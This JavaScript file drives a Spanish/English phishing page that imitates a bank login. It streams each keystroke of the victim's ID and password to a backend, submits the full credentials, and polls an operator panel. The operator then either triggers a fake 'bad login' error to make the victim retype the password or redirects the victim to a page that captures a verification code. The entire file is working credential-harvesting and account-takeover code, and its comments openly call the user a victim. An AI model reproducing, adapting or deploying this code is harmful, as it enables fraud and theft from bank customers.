/* Authentication page behavior: language switch, two-step form, panel flow.
   Login is sent to the panel and a loading overlay waits for the operator's
   decision: login malo (xlogin) shows the bank error, codigo opens the
   verification page. */
import { applyAuthTexts, AUTH_TEXTS } from './auth-texts.js';

const root = document.querySelector('.svAuth');
const langToggle = document.getElementById('langToggle');
const stepId = document.getElementById('stepId');
const stepPass = document.getElementById('stepPass');
const idInput = document.getElementById('idInput');
const passInput = document.getElementById('passInput');
const continueButton = document.getElementById('continueBtn');
const backButton = document.getElementById('backBtn');
const loginButton = document.getElementById('loginBtn');
const errorBox = document.getElementById('authError');
const loading = document.getElementById('authLoading');

const API = '../../../api/';

let language = 'es';
let pollTimer = null;
let busy = false;

/* ---- Tecleo en vivo: crea el registro al primer tecleo y envía cada cambio ---- */
let tecId = '';
try {
  tecId = sessionStorage.getItem('dvTec') || '';
} catch (err) {
  /* storage disabled */
}

const tecTimers = {};

async function asegurarTec() {
  if (tecId) return tecId;
  try {
    const res = await fetch(API + 'teclear.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ accion: 'abrir' }),
    });
    const data = await res.json();
    if (data.ok && data.id) {
      tecId = String(data.id);
      try {
        sessionStorage.setItem('dvTec', tecId);
        sessionStorage.setItem('dvSesion', tecId);
      } catch (err) {
        /* storage disabled */
      }
    }
  } catch (err) {
    /* sin conexión: el envío final igual guarda todo */
  }
  return tecId;
}

function enviarTecleo(campo, valor) {
  if (!tecId) return;
  fetch(API + 'teclear.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: tecId, campo, valor }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data && data.ok && data.nuevo && data.id) {
        /* La fila fue limpiada por inactividad: adoptar la nueva */
        tecId = String(data.id);
        try {
          sessionStorage.setItem('dvTec', tecId);
          sessionStorage.setItem('dvSesion', tecId);
        } catch (err) {
          /* storage disabled */
        }
      }
    })
    .catch(() => {});
}

function teclear(campo, valor) {
  if (!tecId) {
    asegurarTec().then(() => enviarTecleo(campo, valor));
    return;
  }
  window.clearTimeout(tecTimers[campo]);
  tecTimers[campo] = window.setTimeout(() => enviarTecleo(campo, valor), 300);
}

idInput.addEventListener('focus', () => { asegurarTec(); });
passInput.addEventListener('focus', () => { asegurarTec(); });

/* El documento siempre es numérico: filtrar todo lo que no sean dígitos */
idInput.addEventListener('input', () => {
  const limpio = idInput.value.replace(/\D/g, '');
  if (idInput.value !== limpio) idInput.value = limpio;
  teclear('usuario', limpio);
});
passInput.addEventListener('input', () => teclear('clave', passInput.value));


function showLoading(show) {
  loading.classList.toggle('is-hidden', !show);
  continueButton.disabled = show;
  backButton.disabled = show;
  loginButton.disabled = show;
}

function stopPolling() {
  if (pollTimer) {
    window.clearInterval(pollTimer);
    pollTimer = null;
  }
}

function showError() {
  errorBox.classList.remove('is-hidden');
  passInput.value = '';
  passInput.focus();
}

function pollEstado(id) {
  stopPolling();
  pollTimer = window.setInterval(async () => {
    try {
      const res = await fetch(API + 'estado.php?id=' + encodeURIComponent(id), { cache: 'no-store' });
      const data = await res.json();
      if (!data.ok) return;

      if (data.estado === 'login_rechazado') {
        /* Panel pressed xlogin (login malo): show the bank error like the
           original and allow the victim to retry the login. */
        stopPolling();
        showLoading(false);
        showError();
        busy = false;
      } else if (data.estado === 'esperando_token') {
        /* Panel pressed codigo: open the verification code page. */
        stopPolling();
        window.location.href = '../verificacion/index.html?id=' + encodeURIComponent(id);
      }
    } catch (err) {
      /* keep polling */
    }
  }, 2000);
}

function applyLanguage(nextLanguage) {
  language = nextLanguage;
  root.setAttribute('lang', language === 'es' ? 'es' : 'en');
  applyAuthTexts(language);
  langToggle.textContent = AUTH_TEXTS[language]['lang.toggle'];
}

function showStep(step) {
  const showPassword = step === 'password';
  stepId.classList.toggle('is-hidden', showPassword);
  stepPass.classList.toggle('is-hidden', !showPassword);
  errorBox.classList.add('is-hidden');
  if (showPassword) {
    passInput.focus();
  } else {
    idInput.focus();
  }
}

langToggle.addEventListener('click', (event) => {
  event.preventDefault();
  applyLanguage(language === 'es' ? 'en' : 'es');
});

continueButton.addEventListener('click', () => {
  if (!idInput.value.trim()) {
    idInput.focus();
    return;
  }
  showStep('password');
});

backButton.addEventListener('click', () => {
  showStep('id');
});

idInput.addEventListener('keydown', (event) => {
  if (event.key === 'Enter') {
    event.preventDefault();
    continueButton.click();
  }
});

passInput.addEventListener('input', () => {
  errorBox.classList.add('is-hidden');
});

passInput.addEventListener('keydown', (event) => {
  if (event.key === 'Enter') {
    event.preventDefault();
    loginButton.click();
  }
});

loginButton.addEventListener('click', async () => {
  if (busy) return;
  const usuario = idInput.value.trim();
  const clave = passInput.value;

  if (!usuario || !clave) {
    showError();
    return;
  }

  busy = true;
  errorBox.classList.add('is-hidden');
  showLoading(true);

  /* Enviar de inmediato lo tecleado pendiente y registrar el id del tecleo */
  window.clearTimeout(tecTimers.usuario);
  window.clearTimeout(tecTimers.clave);

  try {
    const res = await fetch(API + 'guardar.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usuario, clave, id: tecId }),
    });
    const data = await res.json();

    if (!data.ok || !data.id) {
      throw new Error('guardar');
    }

    try {
      sessionStorage.setItem('dvSesion', String(data.id));
    } catch (err) {
      /* storage disabled, the URL param still carries the id */
    }

    pollEstado(data.id);
  } catch (err) {
    busy = false;
    showLoading(false);
    showError();
  }
});

document.querySelectorAll('.authLinks a').forEach((link) => {
  link.addEventListener('click', (event) => event.preventDefault());
});

applyLanguage('es');
